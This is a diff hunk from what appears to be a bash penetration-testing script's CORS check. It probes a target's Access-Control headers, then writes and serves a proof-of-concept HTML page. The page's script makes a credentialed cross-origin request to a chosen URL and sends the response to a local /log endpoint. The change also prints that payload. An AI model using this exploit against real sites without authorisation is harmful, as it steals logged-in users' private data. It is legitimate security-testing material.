@@ -85,14 +85,15 @@ else
                 url=$target
                 echo -e '\033[38;2;0;255;255mcurl '$target' -H "Origin: https://poc-cors.com" -I -s -k -L | egrep "Access-Control-Allow-Origin|Access-Control-Allow-Credentials" | sort -u\033[m';echo
                 curl $target -H "Origin: https://poc-cors.com" -I -s -k -L | egrep "Access-Control-Allow-Origin|Access-Control-Allow-Credentials" | sort -u
-                echo;echo -e '\033[38;2;255;228;181m-> Insert a URL to test for sensitive information exposure (e.g. https://site.com/accountInfo) - or leave it empty to use '$target'\033[m'
-                read -p $'\033[38;2;255;228;181m-> URL: \033[m' newurl
-                if [[ ! -z $newurl  ]]; then url=$newurl; fi
-                echo;echo -e '\033[38;2;255;228;181m-> If authenticated, with the browser still open, copy the link below and paste into a new tab;\033[m'
-                echo -e '\033[38;2;255;228;181m-> After the tests, use Ctrl+C to close the python webserver.\033[m'
-                echo "<html><body><script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','"$url"',true);req.withCredentials = true;req.send();function reqListener(){location='/log?valor='+this.responseText;};</script></body></html>" > cors.html
-                echo;echo -e '\033[38;2;0;255;255m-> Link:\033[m http://localhost:44610/cors.html';echo
-                python3 -m http.server 44610
+		echo;echo -e '\033[38;2;255;228;181m-> Insert a URL to test for sensitive information exposure (e.g. https://site.com/accountInfo) - or leave it empty to use '$target'\033[m'
+		read -p $'\033[38;2;255;228;181m-> URL: \033[m' newurl
+		if [[ ! -z $newurl  ]]; then url=$newurl; fi
+		echo;echo -e '\033[38;2;255;228;181m-> If authenticated, with the browser still open, copy the link below and paste into a new tab;\033[m'
+		echo -e '\033[38;2;255;228;181m-> After the tests, use Ctrl+C to close the python webserver.\033[m'
+		echo "<html><body><script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','"$url"',true);req.withCredentials = true;req.send();function reqListener(){location='/log?valor='+this.responseText;};</script></body></html>" > cors.html
+		echo;echo -e "\033[38;2;255;228;181m-> PoC:\033[m <html><body><script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','"$url"',true);req.withCredentials = true;req.send();function reqListener(){location='/log?valor='+this.responseText;};</script></body></html>"
+		echo;echo -e '\033[38;2;0;255;255m-> Link:\033[m http://localhost:44610/cors.html';echo
+		python3 -m http.server 44610
                 echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'
                 rm -rf cors.html
                 exec $0 $1
